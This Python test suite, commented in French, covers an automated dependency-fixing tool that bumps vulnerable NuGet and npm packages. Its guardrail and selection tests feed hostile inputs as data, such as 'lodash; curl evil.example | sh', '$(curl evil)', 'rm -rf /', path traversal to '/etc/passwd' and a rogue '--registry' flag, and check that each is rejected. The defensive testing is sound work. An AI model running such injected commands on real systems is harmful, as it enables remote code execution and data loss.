import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from .helpers import LODASH, NEWTONSOFT, FakeTools, finding, make_repo, triage, write_json
from remediation import fixers, guardrails
from remediation.fixers import CannotFix
from remediation.triage_input import TriageError, load_triage, select
from remediation.versions import at_least, is_major_bump, parse, pick_fixed_version


class VersionsTest(unittest.TestCase):
    def test_comparaison(self):
        self.assertLess(parse("12.0.1"), parse("13.0.1"))
        self.assertLess(parse("4.17.20"), parse("4.17.21"))
        self.assertLess(parse("1.2"), parse("1.2.1"))
        self.assertLess(parse("2.0.0-beta.1"), parse("2.0.0"))
        self.assertEqual(parse("1.2"), parse("1.2.0.0"))

    def test_textes_qui_ne_sont_pas_des_versions(self):
        for text in ("", "latest", "^1.2.3", "1.2.3 || 2", "$(Version)", "[1.0,2.0)", "1.2.3; rm -rf /", "1." * 30):
            self.assertIsNone(parse(text), text)

    def test_choix_de_la_version_corrigee(self):
        self.assertEqual(pick_fixed_version("12.0.1", "13.0.1"), "13.0.1")
        # plusieurs branches corrigées : on reste dans la même version majeure
        self.assertEqual(pick_fixed_version("2.1.0", "2.3.1, 3.0.1"), "2.3.1")
        self.assertEqual(pick_fixed_version("3.0.0", "2.3.1, 3.0.1"), "3.0.1")
        self.assertEqual(pick_fixed_version("1.0.0", "2.3.1, 3.0.1"), "2.3.1")

    def test_pas_de_version_convenable(self):
        self.assertIsNone(pick_fixed_version("13.0.1", "12.0.3"))  # plus ancienne
        self.assertIsNone(pick_fixed_version("1.0.0", "2.0.0-rc.1"))  # préversion
        self.assertIsNone(pick_fixed_version("1.0.0", "n'importe quoi"))
        self.assertIsNone(pick_fixed_version("pas une version", "2.0.0"))

    def test_version_majeure_et_minimum(self):
        self.assertTrue(is_major_bump("12.0.1", "13.0.1"))
        self.assertFalse(is_major_bump("4.17.20", "4.17.21"))
        self.assertTrue(at_least("13.0.1", "13.0.1"))
        self.assertFalse(at_least("12.0.3", "13.0.1"))


class GardeFousTest(unittest.TestCase):
    def test_chemins_refuses(self):
        for path in ("../secret", "/etc/passwd", "api/../../x", "api/$(id)/x.csproj", "a\\b", "", None, "x" * 400):
            with self.assertRaises(guardrails.GuardrailError, msg=path):
                guardrails.safe_relative_path(path)
        self.assertEqual(guardrails.safe_relative_path("./api//Api.csproj"), "api/Api.csproj")

    def test_dossiers_interdits(self):
        for path in (".github/workflows/ci.yml", ".github/dependabot.yml", "infra/terraform/main.tf", "INFRA/k8s/api.yaml", ".git/config"):
            self.assertTrue(guardrails.is_forbidden(path), path)
        self.assertFalse(guardrails.is_forbidden("api/Api.csproj"))
        self.assertFalse(guardrails.is_forbidden("infrastructure-notes/package.json"))

    def test_fichiers_modifies(self):
        guardrails.check_changed_files(["api/Api.csproj", "api/packages.lock.json"])
        guardrails.check_changed_files(["web/package.json", "web/package-lock.json", "Directory.Packages.props"])
        refused = (
            [],  # rien de modifié
            ["api/Program.cs"],  # du code : pas en v1
            [".github/workflows/ci.yml"],
            ["infra/terraform/package.json"],
            ["api/Api.csproj", "../hors-repo.csproj"],
            [f"p{n}/package.json" for n in range(guardrails.MAX_FILES_PER_FIX + 1)],
        )
        for paths in refused:
            with self.assertRaises(guardrails.GuardrailError, msg=paths):
                guardrails.check_changed_files(paths)

    def test_noms_de_paquets(self):
        self.assertTrue(guardrails.valid_package_name("nuget", "Newtonsoft.Json"))
        self.assertTrue(guardrails.valid_package_name("npm", "@types/node"))
        for name in ("lodash; rm -rf /", "--registry=http://evil.example", "$(curl evil)", "a b", "../x", "", None, "lodash@latest"):
            self.assertFalse(guardrails.valid_package_name("npm", name), name)
            self.assertFalse(guardrails.valid_package_name("nuget", name), name)

    def test_nombre_de_pr_borne(self):
        self.assertEqual([guardrails.clamp_max_prs(n) for n in (-1, 0, 3, 500)], [0, 0, 3, guardrails.HARD_MAX_PRS])


class SelectionTest(unittest.TestCase):
    def test_paquets_vulnerables_tries_par_risque(self):
        candidates, skipped = select(triage(LODASH, NEWTONSOFT))
        self.assertEqual([c.package for c in candidates], ["Newtonsoft.Json", "lodash"])
        self.assertEqual((candidates[0].ecosystem, candidates[0].target_version), ("nuget", "13.0.1"))
        self.assertEqual(candidates[1].ecosystem, "npm")
        self.assertEqual(skipped, [])

    def test_deux_cve_sur_le_meme_paquet_donnent_un_seul_correctif(self):
        other = finding("c1c2c3c4c5c6", "Newtonsoft.Json", "12.0.1", "13.0.3", "api/packages.lock.json", risk=5.0, advisory="CVE-2099-0001")
        candidates, _ = select(triage(NEWTONSOFT, other))
        self.assertEqual(len(candidates), 1)
        self.assertEqual(candidates[0].id, "a90dea08ce76")  # le finding le plus risqué nomme la branche
        self.assertEqual(candidates[0].target_version, "13.0.3")  # la version qui corrige les deux
        self.assertEqual(candidates[0].advisories, ["CVE-2024-21907", "CVE-2099-0001"])
        self.assertEqual(candidates[0].finding_ids, ["a90dea08ce76", "c1c2c3c4c5c6"])

    def test_findings_hors_perimetre_avec_leur_raison(self):
        others = [
            {"id": "111111111111", "category": "secret", "rules": ["aws-access-token"], "file": "api/appsettings.json"},
            {"id": "222222222222", "category": "code", "rules": ["cs/sql-injection"], "file": "api/A.cs", "recommendation": "Requête paramétrée."},
            finding("333333333333", "requests", "2.0.0", "2.31.0", "requirements.txt"),
            finding("444444444444", "left-pad", "1.0.0", "", "web/package-lock.json"),
            finding("555555555555", "hashicorp-x", "1.0.0", "1.0.1", "infra/terraform/package-lock.json"),
            finding("666666666666", "lodash", "4.17.21", "4.17.20", "web/package-lock.json"),
            {"id": "pas-un-id", "category": "dependency"},
            "pas un objet",
        ]
        candidates, skipped = select(triage(*others))
        self.assertEqual(candidates, [])
        reasons = {item.id: item.reason for item in skipped}
        self.assertIn("révoquer", reasons["111111111111"])
        self.assertIn("patch LLM non disponible", reasons["222222222222"])
        self.assertIn("non géré en v1", reasons["333333333333"])
        self.assertIn("aucune version corrigée", reasons["444444444444"])
        self.assertIn("pas le droit", reasons["555555555555"])
        self.assertIn("plus ancienne", reasons["666666666666"])
        self.assertIn("?", reasons)

    def test_valeurs_dangereuses_ecartees(self):
        attacks = [
            finding("aaaaaaaaaaa1", "lodash; curl evil.example | sh", "1.0.0", "1.0.1", "web/package-lock.json"),
            finding("aaaaaaaaaaa2", "lodash", "1.0.0", "1.0.1 --registry=http://evil.example", "web/package-lock.json"),
            finding("aaaaaaaaaaa3", "lodash", "1.0.0", "1.0.1", "../../etc/package-lock.json"),
            finding("aaaaaaaaaaa4", "lodash", "$(id)", "1.0.1", "web/package-lock.json"),
            finding("../../../main", "lodash", "1.0.0", "1.0.1", "web/package-lock.json"),
        ]
        candidates, skipped = select(triage(*attacks))
        self.assertEqual(candidates, [])
        self.assertEqual(len(skipped), 5)

    def test_triage_inutilisable(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "triage.json"
            for content in ("{", "[]", '{"findings": {}}', '{"schema_version": "2.0", "findings": []}'):
                path.write_text(content, encoding="utf-8")
                with self.assertRaises(TriageError, msg=content):
                    load_triage(path)
            with self.assertRaises(TriageError):
                load_triage(Path(tmp) / "absent.json")


class CorrectifsTest(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.repo, _ = make_repo(Path(self._tmp.name))
        self.nuget = select(triage(NEWTONSOFT))[0][0]
        self.npm = select(triage(LODASH))[0][0]

    def test_bump_msbuild(self):
        cases = {
            '<PackageReference Include="Newtonsoft.Json" Version="12.0.1" />': '<PackageReference Include="Newtonsoft.Json" Version="13.0.1" />',
            '<PackageReference Version="12.0.1" Include="newtonsoft.json"/>': '<PackageReference Version="13.0.1" Include="newtonsoft.json"/>',
            '<PackageVersion Include="Newtonsoft.Json" Version="12.0.1" />': '<PackageVersion Include="Newtonsoft.Json" Version="13.0.1" />',
            '<PackageReference Update="Newtonsoft.Json" Version="12.0.1">': '<PackageReference Update="Newtonsoft.Json" Version="13.0.1">',
        }
        for before, after in cases.items():
            self.assertEqual(fixers.bump_msbuild(before, "Newtonsoft.Json", "13.0.1"), (after, True, True, False))

    def test_bump_msbuild_ne_touche_pas_au_reste(self):
        unchanged = (
            '<PackageReference Include="Serilog" Version="3.0.0" />',  # autre paquet
            '<PackageReference Include="Newtonsoft.Json" Version="13.0.3" />',  # déjà corrigé
            '<PackageReference Include="Newtonsoft.Json.Bson" Version="1.0.0" />',  # nom voisin
        )
        for text in unchanged:
            self.assertEqual(fixers.bump_msbuild(text, "Newtonsoft.Json", "13.0.1")[:2], (text, False))
        self.assertEqual(fixers.bump_msbuild('<PackageReference Include="Newtonsoft.Json" />', "Newtonsoft.Json", "13.0.1")[2:], (False, True))
        for version in ("[12.0,13.0)", "$(NewtonsoftVersion)", "12.*"):
            with self.assertRaises(CannotFix):
                fixers.bump_msbuild(f'<PackageReference Include="Newtonsoft.Json" Version="{version}" />', "Newtonsoft.Json", "13.0.1")

    def test_plan_nuget_direct(self):
        fix = fixers.plan(self.repo, self.nuget)
        self.assertEqual(list(fix.edits), ["api/Api.csproj"])
        self.assertIn('Include="Newtonsoft.Json" Version="13.0.1"', fix.edits["api/Api.csproj"])
        self.assertIn('Include="Serilog" Version="3.0.0"', fix.edits["api/Api.csproj"])
        self.assertEqual((fix.command, fix.command_dir), (["dotnet", "restore", "--force-evaluate"], "api"))
        self.assertIn("12.0.1", (self.repo / "api/Api.csproj").read_text(encoding="utf-8"))  # plan() n'écrit rien

    def test_plan_nuget_versions_centralisees(self):
        (self.repo / "api/Api.csproj").write_text('<Project><ItemGroup><PackageReference Include="Newtonsoft.Json" /></ItemGroup></Project>', encoding="utf-8")
        (self.repo / "Directory.Packages.props").write_text('<Project><ItemGroup><PackageVersion Include="Newtonsoft.Json" Version="12.0.1" /></ItemGroup></Project>', encoding="utf-8")
        fix = fixers.plan(self.repo, self.nuget)
        self.assertEqual(list(fix.edits), ["Directory.Packages.props"])

        in_props = select(triage(finding("d1d2d3d4d5d6", "Newtonsoft.Json", "12.0.1", "13.0.1", "Directory.Packages.props")))[0][0]
        fix = fixers.plan(self.repo, in_props)
        self.assertEqual(list(fix.edits), ["Directory.Packages.props"])
        self.assertEqual(fix.command, ["dotnet", "restore", "--force-evaluate"])  # un lockfile existe dans le repo

    def test_dependance_transitive_pas_de_correctif(self):
        transitive = select(triage(finding("e1e2e3e4e5e6", "System.Text.Encodings.Web", "4.7.1", "4.7.2", "api/packages.lock.json")))[0][0]
        with self.assertRaises(CannotFix) as caught:
            fixers.plan(self.repo, transitive)
        self.assertIn("transitive", str(caught.exception))
        npm_transitive = select(triage(finding("f1f2f3f4f5f6", "minimist", "1.2.5", "1.2.6", "web/package-lock.json")))[0][0]
        with self.assertRaises(CannotFix):
            fixers.plan(self.repo, npm_transitive)

    def test_plan_npm(self):
        fix = fixers.plan(self.repo, self.npm)
        self.assertEqual(fix.edits, {})
        self.assertEqual(fix.command[:3], ["npm", "install", "lodash@4.17.21"])
        self.assertIn("--ignore-scripts", fix.command)
        self.assertIn("--package-lock-only", fix.command)
        self.assertEqual(fix.command_dir, "web")
        self.assertNotIn("--save-exact", fix.command)  # le projet utilise ^4.17.20

        package_json = json.loads((self.repo / "web/package.json").read_text(encoding="utf-8"))
        package_json["dependencies"]["lodash"] = "4.17.20"
        write_json(self.repo / "web/package.json", package_json)
        self.assertIn("--save-exact", fixers.plan(self.repo, self.npm).command)  # version épinglée : on garde ce style

    def test_appliquer_puis_verifier(self):
        for candidate in (self.nuget, self.npm):
            with self.assertRaises(CannotFix):  # avant le correctif : la version vulnérable est là
                fixers.verify(self.repo, candidate)
            fixers.apply(self.repo, fixers.plan(self.repo, candidate), FakeTools())
            fixers.verify(self.repo, candidate)

    def test_outil_en_echec_ou_lockfile_non_regenere(self):
        with self.assertRaises(CannotFix):
            fixers.apply(self.repo, fixers.plan(self.repo, self.nuget), FakeTools(exit_code=1))
        fixers.apply(self.repo, fixers.plan(self.repo, self.nuget), FakeTools(update_lock=False))
        with self.assertRaises(CannotFix) as caught:
            fixers.verify(self.repo, self.nuget)
        self.assertIn("toujours présente", str(caught.exception))

    def test_projet_deja_a_jour_mais_lockfile_en_retard(self):
        text = (self.repo / "api/Api.csproj").read_text(encoding="utf-8").replace("12.0.1", "13.0.1")
        (self.repo / "api/Api.csproj").write_text(text, encoding="utf-8")
        fix = fixers.plan(self.repo, self.nuget)
        self.assertEqual(fix.edits, {})  # rien à changer dans le projet
        self.assertEqual(fix.command[:2], ["dotnet", "restore"])  # mais le lockfile doit être régénéré
        fixers.apply(self.repo, fix, FakeTools())
        fixers.verify(self.repo, self.nuget)

    def test_copie_imbriquee_vulnerable_detectee(self):
        lock = json.loads((self.repo / "web/package-lock.json").read_text(encoding="utf-8"))
        lock["packages"]["node_modules/autre/node_modules/lodash"] = {"version": "4.17.20"}
        write_json(self.repo / "web/package-lock.json", lock)
        fixers.apply(self.repo, fixers.plan(self.repo, self.npm), FakeTools())
        with self.assertRaises(CannotFix):
            fixers.verify(self.repo, self.npm)

    def test_lien_symbolique_hors_du_repo_refuse(self):
        outside = Path(self._tmp.name) / "hors-repo.csproj"
        outside.write_text('<PackageReference Include="Newtonsoft.Json" Version="12.0.1" />', encoding="utf-8")
        (self.repo / "api/Api.csproj").unlink()
        os.symlink(outside, self.repo / "api/Api.csproj")
        with self.assertRaises(CannotFix):
            fixers.plan(self.repo, self.nuget)
        self.assertIn("12.0.1", outside.read_text(encoding="utf-8"))

    def test_l_outil_ne_voit_pas_les_secrets_de_l_environnement(self):
        # Secrets du job + jetons ajoutés par GitHub Actions lui-même.
        secrets = ["GITHUB_TOKEN", "AUTOFIX_TOKEN", "GEMINI_API_KEY", "ACTIONS_RUNTIME_TOKEN",
                   "ACTIONS_ID_TOKEN_REQUEST_TOKEN", "NUGET_PASSWORD", "AZURE_CLIENT_SECRET"]
        # Variables sans secret, utiles aux outils : elles doivent rester visibles.
        visible = ["VISIBLE_VALUE", "GITHUB_REPOSITORY", "GITHUB_WORKSPACE"]
        names = secrets + visible
        program = f"import os; print(sorted(k for k in {names!r} if k in os.environ))"
        with mock.patch.dict(os.environ, {name: "x" for name in names}):
            code, output = fixers.run_tool([sys.executable, "-c", program], self.repo)
        self.assertEqual((code, output.strip()), (0, str(sorted(visible))))

    def test_outil_absent(self):
        with self.assertRaises(CannotFix) as caught:
            fixers.run_tool(["outil-qui-n-existe-pas"], self.repo)
        self.assertIn("pas installé", str(caught.exception))


if __name__ == "__main__":
    unittest.main()
